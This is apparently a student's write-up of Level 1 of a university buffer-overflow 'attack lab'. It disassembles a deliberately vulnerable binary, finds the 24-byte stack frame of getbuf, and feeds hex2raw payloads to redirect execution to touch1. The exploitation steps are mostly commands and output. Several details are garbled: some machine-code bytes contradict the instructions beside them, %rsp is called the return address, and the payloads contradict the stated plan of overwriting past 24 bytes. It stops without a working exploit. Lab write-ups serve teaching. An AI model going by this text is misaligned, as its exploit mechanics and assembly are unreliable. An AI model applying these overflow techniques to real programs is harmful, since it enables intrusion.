# Attack lab

By Adrian Borup (adbo@itu.dk).

## Part I: Code Injection Attacks

### Level 1

We start by inspecting the assembly to find the address of the `touch1` function:

```asm
$ objdump -D ctarget | grep -A 14 "<touch1>"
0000000000001e47 <touch1>:
    1e47:	f3 0f 1e fa          	endbr64 
    1e4b:	50                   	push   %rax
    1e4c:	58                   	pop    %rax
    1e4d:	48 83 ec 08          	sub    $0x8,%rsp
    1e51:	c7 05 81 55 11 00 01 	movl   $0x1,0x5581(%rip)        # 73dc <vlevel>
    1e58:	11 00 00 
    1e5b:	48 8d 3d a9 24 11 00 	lea    0x24a9(%rip),%rdi        # 430b <_IO_stdin_used+0x30b>
    1e62:	e8 39 f4 ff ff       	callq  12a0 <puts@plt>
    1e67:	bf 01 11 00 00       	mov    $0x1,%edi
    1e6c:	e8 f4 04 11 00       	callq  2365 <validate>
    1e71:	bf 11 00 00 00       	mov    $0x0,%edi
    1e76:	e8 85 f5 ff ff       	callq  1411 <exit@plt>

0000000000001e7b <touch2>:
```

Our goal is now to overwrite the return address after `getbuf` so it points to `0x1e47`. We want to know the size of the stack frame so we can overwrite the return address. Let's check out `getbuf`'s assembly code:

```asm
$ objdump -D ctarget | grep -A 9 -m 1 "<getbuf>"
0000000000001e2d <getbuf>:
    1e2d:       f3 0f 1e fa             endbr64
    1e31:       48 83 ec 18             sub    $0x18,%rsp
    1e35:       48 89 e7                mov    %rsp,%rdi
    1e38:       e8 b5 02 00 00          callq  20f2 <Gets>
    1e3d:       b8 01 00 00 00          mov    $0x1,%eax
    1e42:       48 83 c4 18             add    $0x18,%rsp
    1e46:       c3                      retq

0000000000001e47 <touch1>:
```

At instruction `0x1e31`, we can see an integer constant `$0x18`, which is 24 in decimal. The return address, `%rsp`, is decremented with 24 bytes - therefore our stack frame must be 24 bytes in size. We can confirm this by seeing if the program starts to misbehave between 23 and 24 bytes of input:

```sh
$ echo "00000000000000000000000" | ./ctarget
Cookie: 0x3c1eff45
Type string:No exploit.  Getbuf returned 0x1
Normal return
$ echo "000000000000000000000000" | ./ctarget
Cookie: 0x3c1eff45
Type string:Ouch!: You caused a segmentation fault!
Better luck next time
FAILED
```

Yup! Boom.

The segfault happens when we feed 24 bytes. Therefore, let's try to make the 24th byte `0x1e47` (the address of `touch1`):

```sh
$ echo "47 1e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" | ./hex2raw | ./ctarget
$ echo "47 1e 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" | ./hex2raw | ./ctarget
$ echo "47 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" | ./hex2raw | ./ctarget
```
